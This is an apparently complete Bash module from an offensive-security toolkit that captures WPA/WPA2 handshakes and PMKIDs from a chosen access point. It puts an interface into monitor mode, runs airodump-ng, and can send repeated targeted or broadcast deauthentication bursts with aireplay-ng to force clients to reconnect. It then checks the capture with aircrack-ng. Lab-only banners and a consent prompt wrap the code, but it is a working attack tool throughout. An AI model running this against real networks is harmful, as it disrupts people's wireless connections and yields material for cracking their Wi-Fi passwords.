#!/usr/bin/env bash
# HZ_NAME=Advanced Wi-Fi Handshake & EAPOL Hunter
# HZ_DESC=Targets specific APs to capture WPA/WPA2 4-way handshakes for authorized offline lab audits.
# HZ_VERSION=3.3.0
# HZ_AUTHOR=Higer23 & Advanced Cyber Lab
# HZ_CATEGORY=wireless_offensive
# HZ_REQUIRES_ROOT=yes
# HZ_REQUIRES_MONITOR=yes
# HZ_LAB_ONLY=yes

# ============================================================================
# HigerZero Module: Advanced Wi-Fi Handshake & EAPOL Hunter
# Authorized lab-only WPA handshake capture with optional deauth assist.
# ============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# 1. FRAMEWORK FALLBACKS
# ---------------------------------------------------------------------------
: "${RED:=$'\033[0;31m'}"
: "${GREEN:=$'\033[0;32m'}"
: "${YELLOW:=$'\033[1;33m'}"
: "${BLUE:=$'\033[0;34m'}"
: "${MAGENTA:=$'\033[0;35m'}"
: "${WHITE:=$'\033[1;37m'}"
: "${NC:=$'\033[0m'}"

: "${PROJECT_ROOT:=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
: "${REPORT_DIR:=${PROJECT_ROOT}/reports}"
: "${CAPTURE_DIR:=${PROJECT_ROOT}/captures}"
: "${LOG_DIR:=${PROJECT_ROOT}/logs}"
mkdir -p "$REPORT_DIR" "$CAPTURE_DIR" "$LOG_DIR"

: "${LAB_INTERFACE:=}"
: "${DEBUG:=0}"
: "${MODULE_TIMEOUT:=600}"    # handshake için 10 dk makul

declare -F log_info  >/dev/null 2>&1 || log_info()  { echo -e "${GREEN}[INFO]${NC}  $*"; }
declare -F log_warn  >/dev/null 2>&1 || log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $*" >&2; }
declare -F log_error >/dev/null 2>&1 || log_error() { echo -e "${RED}[ERROR]${NC} $*" >&2; }
declare -F log_debug >/dev/null 2>&1 || log_debug() { [[ "${DEBUG}" == "1" ]] && echo -e "${BLUE}[DEBUG]${NC} $*" || true; }
declare -F print_banner >/dev/null 2>&1 || print_banner() { echo -e "${WHITE}=== HigerZero :: Handshake Hunter ===${NC}"; }
declare -F log_event >/dev/null 2>&1 || log_event() { :; }

if ! declare -p HIGERZERO_SESSION_METRICS &>/dev/null; then
    declare -gA HIGERZERO_SESSION_METRICS=()
fi

# ---------------------------------------------------------------------------
# 2. GLOBAL STATE
# ---------------------------------------------------------------------------
declare -a HUNTER_CHILD_PIDS=()
declare    SPAWNED_MON_IFACE=""
declare    MONITOR_ACTIVE=0
declare    AIRODUMP_PID=""
declare    DEAUTH_PID=""
declare    ORIGINAL_CHANNEL=""

# ---------------------------------------------------------------------------
# 3. CLEANUP
# ---------------------------------------------------------------------------
cleanup_hunter_ops() {
    local rc=$?
    echo -e "\n${YELLOW}[*] Stopping capture processes and restoring interface state...${NC}"

    local pid
    for pid in "${HUNTER_CHILD_PIDS[@]:-}"; do
        [[ -n "$pid" ]] && kill "$pid" 2>/dev/null || true
    done

    pkill -P "$$" airodump-ng 2>/dev/null || true
    pkill -P "$$" aireplay-ng 2>/dev/null || true

    if (( MONITOR_ACTIVE )) && [[ -n "$SPAWNED_MON_IFACE" ]]; then
        echo -e "${YELLOW}[*] Stopping monitor interface $SPAWNED_MON_IFACE...${NC}"
        airmon-ng stop "$SPAWNED_MON_IFACE" &>/dev/null || true
        if command -v systemctl >/dev/null 2>&1; then
            systemctl restart NetworkManager &>/dev/null || true
        fi
    fi

    log_event "INFO" "Handshake Hunter cleaned up (rc=$rc)."
    return $rc
}

# ---------------------------------------------------------------------------
# 4. YARDIMCILAR
# ---------------------------------------------------------------------------
valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

valid_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 196 ))
}

is_monitor_iface() {
    iwconfig "$1" 2>/dev/null | grep -q "Mode:Monitor"
}

get_iface_channel() {
    iwconfig "$1" 2>/dev/null | grep -oE 'Channel[: ]+[0-9]+' | grep -oE '[0-9]+' | head -1
}

list_wireless_ifaces() {
    iwconfig 2>/dev/null | awk '/IEEE 802.11/ {print $1}'
}

detect_monitor_iface() {
    airmon-ng 2>/dev/null | awk '/Monitor/ {print $2; exit}'
}

set_iface_channel() {
    local iface="$1" ch="$2"
    iwconfig "$iface" channel "$ch" 2>/dev/null \
        || iw dev "$iface" set channel "$ch" 2>/dev/null \
        || return 1
}

# aircrack-ng çıktısından handshake durumunu belirle (sağlam yöntem)
check_handshake_status() {
    local cap="$1" bssid="$2"

    if [[ ! -s "$cap" ]]; then
        echo "no_capture"
        return
    fi

    # aircrack-ng'yi -w /dev/null ile çağır: sadece handshake/PMKID kontrolü yapar
    local out
    out=$(aircrack-ng -w /dev/null -b "$bssid" "$cap" 2>&1 || true)

    if echo "$out" | grep -qiE "1 handshake|WPA \(1 handshake"; then
        echo "captured"
    elif echo "$out" | grep -qiE "PMKID"; then
        echo "pmkid"
    elif echo "$out" | grep -qiE "0 handshake"; then
        echo "no_handshake"
    elif echo "$out" | grep -qiE "EAPOL"; then
        echo "eapol_only"
    else
        echo "unknown"
    fi
}

# Cap dosyasını zaman damgasına göre bul (airodump -01/-02/-03 üretebilir)
find_latest_cap() {
    local prefix="$1"
    ls -t "${prefix}"-*.cap 2>/dev/null | head -1
}

# Cap dosyasından client MAC'lerini çıkar (CSV üzerinden)
extract_clients() {
    local csv="$1"
    if [[ ! -s "$csv" ]]; then
        echo "none"
        return
    fi
    # airodump CSV: "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
    awk -F',' 'NR>2 && $1 ~ /:/ {gsub(/ /,"",$1); print $1}' "$csv" | sort -u | head -10 | paste -sd, - || echo "none"
}

# ---------------------------------------------------------------------------
# 5. ANA MODÜL
# ---------------------------------------------------------------------------
module_main() {
    trap cleanup_hunter_ops INT TERM

    print_banner
    echo -e "${RED}[RED TEAM MODULE]${NC} ${WHITE}Advanced Wi-Fi Handshake & EAPOL Hunter v3.3${NC}"
    echo -e "${WHITE}Captures WPA/WPA2 4-way handshakes for authorized lab analysis.${NC}"
    log_event "INFO" "Initializing Handshake Hunter v3.3."

    if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
        log_error "Airodump-ng and monitor mode operations require root (sudo)."
        log_event "ERROR" "Non-root execution blocked."
        return 1
    fi

    local missing=()
    local tool
    for tool in airodump-ng aircrack-ng airmon-ng iwconfig ip; do
        command -v "$tool" &>/dev/null || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
        log_error "Missing tools: ${missing[*]}"
        log_error "Install: sudo apt install aircrack-ng wireless-tools iproute2"
        log_event "ERROR" "Missing dependencies: ${missing[*]}"
        return 1
    fi

    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    echo -e "${MAGENTA} AUTHORIZED USE ONLY — Listens for wireless management frames.${NC}"
    echo -e "${MAGENTA} Only run in isolated lab environments with explicit ownership.${NC}"
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    local consent
    read -r -p "Confirm authorized lab environment usage? (yes/no): " consent
    if [[ ! "$consent" =~ ^[Yy][Ee][Ss]$ ]]; then
        log_warn "Authorization not confirmed. Aborting."
        log_event "WARN" "User did not confirm authorized use."
        return 1
    fi

    echo -e "${YELLOW}[*] Detecting wireless interfaces...${NC}"
    local ifaces
    ifaces=$(list_wireless_ifaces || true)
    [[ -n "$ifaces" ]] && echo "$ifaces" | while IFS= read -r i; do echo "    - $i"; done

    local target_iface="${LAB_INTERFACE}"
    read -r -p "Enter interface name${target_iface:+ [default: $target_iface]}: " custom_iface
    target_iface="${custom_iface:-$target_iface}"

    if [[ -z "$target_iface" ]] || ! iwconfig "$target_iface" &>/dev/null; then
        log_error "Invalid or missing interface provided."
        return 1
    fi

    ORIGINAL_CHANNEL=$(get_iface_channel "$target_iface" || true)

    if ! is_monitor_iface "$target_iface"; then
        echo -e "${YELLOW}[*] '$target_iface' is not in monitor mode.${NC}"
        local enable_mon
        read -r -p "Enable monitor mode via airmon-ng? (y/n): " enable_mon
        if [[ "$enable_mon" =~ ^[Yy]$ ]]; then
            airmon-ng check kill &>/dev/null || true
            airmon-ng start "$target_iface" &>/dev/null || true
            local new_iface
            new_iface=$(detect_monitor_iface || true)
            if [[ -n "$new_iface" ]]; then
                target_iface="$new_iface"
            else
                target_iface="${target_iface}mon"
            fi
            SPAWNED_MON_IFACE="$target_iface"
            MONITOR_ACTIVE=1
        else
            log_error "Monitor mode required. Aborting."
            return 1
        fi
    fi

    if ! is_monitor_iface "$target_iface"; then
        log_error "Failed to verify monitor mode on '$target_iface'."
        return 1
    fi

    echo -e "${GREEN}[+] Active monitor interface: ${WHITE}$target_iface${NC}"
    log_event "SUCCESS" "Monitor interface active: $target_iface"

    # --- Hedef ---
    local target_bssid="" target_channel=""
    read -r -p "Enter Target AP BSSID (Required): " target_bssid
    if [[ -z "$target_bssid" ]] || ! valid_mac "$target_bssid"; then
        log_error "Valid target BSSID is mandatory."
        return 1
    fi

    read -r -p "Enter Target Channel (1-196): " target_channel
    if ! valid_channel "$target_channel"; then
        log_error "Invalid channel: $target_channel"
        return 1
    fi

    set_iface_channel "$target_iface" "$target_channel" || log_warn "Could not lock channel."

    # --- Deauth assist (opsiyonel) ---
    local deauth_assist="no"
    local target_client=""
    read -r -p "Deauth assist to force handshake? (y/n) [n]: " deauth_assist
    if [[ "$deauth_assist" =~ ^[Yy]$ ]]; then
        read -r -p "Target client MAC (blank = broadcast deauth): " target_client
        if [[ -n "$target_client" ]] && ! valid_mac "$target_client"; then
            log_error "Invalid client MAC: $target_client"
            return 1
        fi
    fi

    local timestamp
    timestamp=$(date +%s)
    local capture_prefix="${CAPTURE_DIR}/handshake_${timestamp}"
    local audit_log="${LOG_DIR}/handshake_hunter_${timestamp}.log"
    local json_report="${REPORT_DIR}/handshake_hunter_${timestamp}.json"

    HIGERZERO_SESSION_METRICS["handshake_prefix"]="$capture_prefix"
    HIGERZERO_SESSION_METRICS["handshake_report"]="$json_report"

    local duration
    read -r -p "Capture duration in seconds (10-${MODULE_TIMEOUT}, default: 60): " duration
    duration="${duration:-60}"
    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 10 || duration > MODULE_TIMEOUT )); then
        log_error "Duration must be between 10 and ${MODULE_TIMEOUT} seconds."
        return 1
    fi

    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}  Target AP      : ${MAGENTA}$target_bssid${NC}"
    echo -e "${WHITE}  Channel        : ${MAGENTA}$target_channel${NC}"
    echo -e "${WHITE}  Interface      : ${MAGENTA}$target_iface${NC}"
    echo -e "${WHITE}  Duration       : ${MAGENTA}${duration}s${NC}"
    echo -e "${WHITE}  Deauth Assist  : ${MAGENTA}${deauth_assist}${NC}"
    [[ -n "$target_client" ]] && echo -e "${WHITE}  Target Client  : ${MAGENTA}$target_client${NC}"
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"

    local confirm_run
    read -r -p "Start handshake capture session? (yes/no): " confirm_run
    if [[ ! "$confirm_run" =~ ^[Yy][Ee][Ss]$ ]]; then
        log_warn "Aborted by user."
        return 0
    fi

    echo -e "${GREEN}[+] Launching airodump-ng capture engine...${NC}"
    log_event "SUCCESS" "Starting airodump-ng against BSSID $target_bssid on channel $target_channel."

    # --ignore-negative-one: bazı sürücüler için zorunlu
    # --write-interval 1: kayıp yaşamamak için
    # --update 1: arayüz hızlı güncellensin
    airodump-ng \
        --bssid "$target_bssid" \
        --channel "$target_channel" \
        --write "$capture_prefix" \
        --output-format pcap,csv \
        --write-interval 1 \
        --update 1 \
        --ignore-negative-one \
        "$target_iface" > "$audit_log" 2>&1 &
    AIRODUMP_PID=$!
    HUNTER_CHILD_PIDS+=("$AIRODUMP_PID")

    sleep 3
    if ! kill -0 "$AIRODUMP_PID" 2>/dev/null; then
        log_error "airodump-ng failed to start. Check log: $audit_log"
        tail -10 "$audit_log" >&2 || true
        return 1
    fi
    echo -e "${GREEN}[+] Capture active (PID $AIRODUMP_PID). Listening for EAPOL frames...${NC}"

    # --- Deauth assist ---
    if [[ "$deauth_assist" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}[*] Deauth assist enabled — sending periodic deauth bursts...${NC}"
        (
            # Her 15 saniyede bir 5'li deauth burst gönder
            while kill -0 "$AIRODUMP_PID" 2>/dev/null; do
                if [[ -n "$target_client" ]]; then
                    aireplay-ng --deauth 5 -a "$target_bssid" -c "$target_client" "$target_iface" &>/dev/null || true
                else
                    aireplay-ng --deauth 5 -a "$target_bssid" "$target_iface" &>/dev/null || true
                fi
                sleep 15
            done
        ) &
        DEAUTH_PID=$!
        HUNTER_CHILD_PIDS+=("$DEAUTH_PID")
    fi

    # --- Sabit süreli bekleme ---
    local start_ts end_ts elapsed
    start_ts=$(date +%s)
    end_ts=$(( start_ts + duration ))

    local next_report=$(( start_ts + 5 ))
    local dot_counter=0
    while (( $(date +%s) < end_ts )); do
        if ! kill -0 "$AIRODUMP_PID" 2>/dev/null; then
            echo -e "\n${YELLOW}[!] airodump-ng exited prematurely.${NC}"
            break
        fi
        if (( $(date +%s) >= next_report )); then
            # Erken handshake tespiti: .cap dosyası oluştuysa aircrack ile kontrol et
            local early_cap
            early_cap=$(find_latest_cap "$capture_prefix")
            if [[ -n "$early_cap" && -s "$early_cap" ]]; then
                local early_status
                early_status=$(check_handshake_status "$early_cap" "$target_bssid")
                if [[ "$early_status" == "captured" || "$early_status" == "pmkid" ]]; then
                    echo -e "\n${GREEN}[+] Handshake detected early! Stopping capture.${NC}"
                    log_event "SUCCESS" "Handshake detected early (${early_status})."
                    break
                fi
            fi
            echo -ne "${YELLOW}.${NC}"
            next_report=$(( next_report + 5 ))
            dot_counter=$(( dot_counter + 1 ))
        fi
        sleep 1
    done
    echo ""

    elapsed=$(( $(date +%s) - start_ts ))

    # --- Deauth process'i durdur ---
    if [[ -n "$DEAUTH_PID" ]] && kill -0 "$DEAUTH_PID" 2>/dev/null; then
        kill -TERM "$DEAUTH_PID" 2>/dev/null || true
    fi

    # --- airodump'u nazikçe durdur ---
    if kill -0 "$AIRODUMP_PID" 2>/dev/null; then
        kill -TERM "$AIRODUMP_PID" 2>/dev/null || true
        sleep 2
        kill -KILL "$AIRODUMP_PID" 2>/dev/null || true
    fi
    wait "$AIRODUMP_PID" 2>/dev/null || true

    # --- Cap dosyasını bul ---
    local cap_file
    cap_file=$(find_latest_cap "$capture_prefix")
    local csv_file="${capture_prefix}-01.csv"

    # --- Handshake durumu ---
    local handshake_status="no_capture"
    if [[ -n "$cap_file" && -s "$cap_file" ]]; then
        handshake_status=$(check_handshake_status "$cap_file" "$target_bssid")
    fi

    case "$handshake_status" in
        captured)
            echo -e "${GREEN}[+] SUCCESS: WPA/WPA2 4-way handshake captured!${NC}"
            log_event "SUCCESS" "Handshake captured in $cap_file."
            ;;
        pmkid)
            echo -e "${GREEN}[+] SUCCESS: PMKID captured!${NC}"
            log_event "SUCCESS" "PMKID captured in $cap_file."
            ;;
        eapol_only)
            echo -e "${YELLOW}[!] EAPOL frames seen but no complete handshake.${NC}"
            ;;
        no_handshake)
            echo -e "${YELLOW}[!] No handshake captured. Try longer duration or deauth assist.${NC}"
            ;;
        no_capture)
            echo -e "${RED}[!] No capture file produced.${NC}"
            ;;
        *)
            echo -e "${YELLOW}[!] Handshake status unknown. Check $cap_file manually.${NC}"
            ;;
    esac

    local clients
    clients=$(extract_clients "$csv_file")

    # --- JSON Rapor ---
    if command -v jq >/dev/null 2>&1; then
        jq -n \
            --arg ts "$timestamp" \
            --arg iface "$target_iface" \
            --arg bssid "$target_bssid" \
            --arg ch "$target_channel" \
            --argjson dur "$elapsed" \
            --arg status "$handshake_status" \
            --arg cap "${cap_file:-none}" \
            --arg clients "$clients" \
            --arg deauth "$deauth_assist" \
            '{
                timestamp: $ts,
                interface: $iface,
                target_bssid: $bssid,
                channel: $ch,
                duration_seconds: $dur,
                handshake_status: $status,
                capture_file: $cap,
                clients_seen: $clients,
                deauth_assist: $deauth
            }' > "$json_report"
    else
        cat > "$json_report" <<EOF
{
  "timestamp": "$timestamp",
  "interface": "$target_iface",
  "target_bssid": "$target_bssid",
  "channel": "$target_channel",
  "duration_seconds": $elapsed,
  "handshake_status": "$handshake_status",
  "capture_file": "${cap_file:-none}",
  "clients_seen": "$clients",
  "deauth_assist": "$deauth_assist"
}
EOF
    fi

    # --- Kanalı geri yükle ---
    if [[ -n "$ORIGINAL_CHANNEL" ]] && valid_channel "$ORIGINAL_CHANNEL"; then
        set_iface_channel "$target_iface" "$ORIGINAL_CHANNEL" 2>/dev/null || true
    fi

    echo -e "${GREEN}[+] Capture file :${NC} ${cap_file:-N/A}"
    echo -e "${GREEN}[+] CSV          :${NC} ${csv_file:-N/A}"
    echo -e "${GREEN}[+] JSON report  :${NC} $json_report"
    log_event "SUCCESS" "Handshake Hunter finished execution (status=$handshake_status)."

    return 0
}

# ---------------------------------------------------------------------------
# 6. LIFECYCLE HOOKS
# ---------------------------------------------------------------------------
module_init()    { log_debug "handshake_hunter: init"; }
module_cleanup() { log_debug "handshake_hunter: cleanup"; }

export -f module_init module_main module_cleanup 2>/dev/null || true

# ---------------------------------------------------------------------------
# 7. DOĞRUDAN ÇALIŞTIRMA
# ---------------------------------------------------------------------------
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    module_main "$@"
fi
